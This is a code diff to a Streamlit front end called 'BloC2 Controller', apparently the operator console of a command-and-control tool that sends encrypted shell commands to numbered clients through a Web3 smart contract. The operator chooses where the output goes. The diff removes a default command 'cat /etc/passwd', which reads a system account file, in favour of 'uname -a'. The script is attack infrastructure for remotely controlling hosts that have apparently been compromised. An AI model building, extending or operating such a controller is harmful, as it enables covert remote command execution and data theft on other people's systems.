@@ -14,12 +14,6 @@ config.read('server.conf')
 # Define and connect a new Web3 provider
 w3 = Web3(Web3.HTTPProvider(config['DEFAULT']['Web3ProviderUri']))
 
-################################################################################
-# Contract Helper function:
-# 1. Loads the contract once using cache
-# 2. Connects to the contract using the contract address and ABI
-################################################################################
-
 # Cache the contract on load
 @st.cache(allow_output_mutation=True)
 # Define the load_contract function
@@ -60,11 +54,7 @@ def encrypt_command(client_id, command, response_type, response_dest):
 
     return encrypted_json
 
-
-
-################################################################################
-# Issue Command
-################################################################################
+# List all the possible response types and some example destinations
 poss_responses = {
     '/dev/null': '/dev/null',
     'Local File': '/tmp/cmd.out',
@@ -74,10 +64,13 @@ poss_responses = {
 }
 
 operator_account = config['DEFAULT']['MasterAccountAddress']
+
+st.title('BloC2 Controller')
 client_id = st.number_input('Client ID', value=0, step=1)
-command = st.text_input('Command to Send', value='cat /etc/passwd')
+command = st.text_input('Command to Send', value='uname -a')
 response_type = st.selectbox('Where should command output go?', poss_responses.keys())
 
+# Present a new text input if the response destination is not /dev/null
 if response_type == '/dev/null':
     response_dest = poss_responses[response_type]
 else:
